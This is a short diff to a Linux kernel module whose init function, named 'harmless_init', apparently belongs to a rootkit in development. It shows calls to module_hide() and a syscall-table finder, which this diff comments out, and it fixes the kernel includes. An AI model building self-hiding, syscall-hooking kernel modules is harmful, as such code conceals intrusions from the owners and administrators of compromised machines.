@@ -1,7 +1,7 @@
-// #include <linux/init.h>             // Macros used to mark up functions e.g., __init __exit
-// #include <linux/module.h>           // Core header for loading LKMs into the kernel
-// #include <linux/kernel.h>           // Contains types, macros, functions for the kernel
-#include <linux.h>
+#include <linux/init.h>             // Macros used to mark up functions e.g., __init __exit
+#include <linux/module.h>           // Core header for loading LKMs into the kernel
+#include <linux/kernel.h>           // Contains types, macros, functions for the kernel
+#include <linux/syscalls.h>
 
 MODULE_LICENSE("GPL") ;
 
@@ -42,12 +42,12 @@ static void module_hide(void){
  *  @return returns 0 if successful
  */
 static int __init harmless_init(void){
-    module_hide();
-    syscall_table = dinamically_find_syscall_table();
+    //module_hide();
+    //syscall_table = dinamically_find_syscall_table();
     printk(KERN_INFO "EBB: Hello from the BBB LKM!\n");
-    if(syscall_table == NULL)
-      printk(KERN_INFO "Couldn't find syscall_table????!\n");
-      return -1;
+    //if(syscall_table == NULL)
+      //printk(KERN_INFO "Couldn't find syscall_table????!\n");
+      //return -1;
     return 0;
 }
 
